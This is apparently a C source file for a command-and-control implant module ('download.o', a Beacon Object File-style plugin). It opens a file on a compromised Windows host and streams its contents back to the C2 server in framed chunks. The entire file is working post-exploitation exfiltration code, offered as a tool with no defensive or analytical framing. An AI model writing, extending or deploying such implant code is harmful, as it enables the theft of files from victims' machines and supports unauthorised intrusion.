/*
 * download.o - stream a remote file back to the C2 server in chunks.
 *
 * Wire layout (all frames are POUT_DATA):
 *   header : [4B 0x01][4B totalSize][2B pathLen][path]
 *   chunks : [4B 0x02][4B offset][data...]
 *   end    : [4B 0x03]
 */
#include <windows.h>
#include "../bof.h"

void go(char *args, int length) {
    char *path = (char *)b_malloc(length + 1);
    if (!path) { b_send(POUT_ERR, "oom", 3); return; }
    memcpy(path, args, length);
    path[length] = 0;

    HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                            OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        char e[256];
        int l = wsprintfA(e, "ERROR: cannot open %s (err=%lu)\r\n", path, GetLastError());
        b_send(POUT_ERR, e, l);
        b_send(POUT_DONE, "", 0);
        return;
    }
    DWORD total = GetFileSize(hf, NULL);
    DWORD plen = (DWORD)strlen(path);

    /* header */
    BYTE *hdr = (BYTE *)b_malloc(10 + plen);
    if (!hdr) { CloseHandle(hf); b_send(POUT_ERR, "oom", 3); return; }
    *(DWORD *)hdr = 0x01;
    *(DWORD *)(hdr + 4) = total;
    *(WORD *)(hdr + 8) = (WORD)plen;
    memcpy(hdr + 10, path, plen);
    b_send(POUT_DATA, hdr, 10 + plen);

    /* chunks */
    BYTE *buf = (BYTE *)b_malloc(65535 + 8);
    DWORD offset = 0;
    while (buf && offset < total) {
        DWORD want = (total - offset > 65535) ? 65535 : (total - offset);
        DWORD got;
        *(DWORD *)buf = 0x02;
        if (ReadFile(hf, buf + 8, want, &got, NULL) && got > 0) {
            *(DWORD *)(buf + 4) = offset;
            b_send(POUT_DATA, buf, 8 + got);
            offset += got;
        } else break;
    }
    CloseHandle(hf);

    /* end marker */
    BYTE end[4];
    *(DWORD *)end = 0x03;
    b_send(POUT_DATA, end, 4);
    b_send(POUT_DONE, "", 0);
}
